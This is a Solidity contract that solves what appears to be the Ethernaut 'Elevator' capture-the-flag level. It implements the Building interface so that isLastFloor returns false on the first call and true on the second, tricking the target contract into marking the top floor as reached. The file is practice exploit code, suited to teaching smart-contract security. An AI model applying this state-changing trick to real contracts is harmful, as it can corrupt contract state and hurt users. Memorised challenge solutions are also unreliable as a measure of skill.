// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract Solution is Building {
    bool switch_;

    // there is really no need for the '_floor' parameter
    // this function just have to return false the first time
    // and true the second time
    function isLastFloor(uint256 _floor) external override returns (bool) {
        if (!switch_) {
            // turn on switch if it's off and return false
            switch_ = true;
            return false;
        }
        return switch_;
    }

    // pass in your instance address and any number (positive) as the floor
    function solve(address instance, uint _floor) external {
        Elevator(instance).goTo(_floor);
    }
}